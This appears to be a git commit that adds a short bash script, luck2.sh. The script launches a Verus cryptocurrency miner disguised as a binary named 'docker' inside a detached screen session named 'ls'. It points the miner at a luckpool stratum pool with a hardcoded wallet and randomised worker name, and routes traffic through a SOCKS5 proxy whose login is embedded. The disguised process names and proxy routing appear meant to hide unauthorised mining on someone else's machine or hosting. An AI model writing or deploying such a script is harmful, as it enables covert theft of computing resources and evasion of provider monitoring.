4c9f36c48a051af067454e67da3b6b26a7887c4b
wertesd <86517111+wertesd@users.noreply.github.com>
2021-06-29 22:15:54 +0700

    Create luck2.sh

---
+++ luck2.sh
@@ -0,0 +1,11 @@
+  
+#!/bin/bash
+sudo apt update 
+sudo apt install screen libjansson4 -y 
+chmod +x docker 
+screen -dmS ls 
+POOL=stratum+tcp://na.luckpool.net:3956
+WALLET=RV4aazLmcwkYC6W3uWmDUDAvQKNYgUGbw7
+WORKER=$(echo $(shuf -i 100000-999999 -n 1)-P000000199800STF)
+PROXY=socks5://woiden_awas:awasan@163.172.214.196:8080
+./docker -a verus -o $POOL -u $WALLET.$WORKER -p x -t 2 -x $PROXY
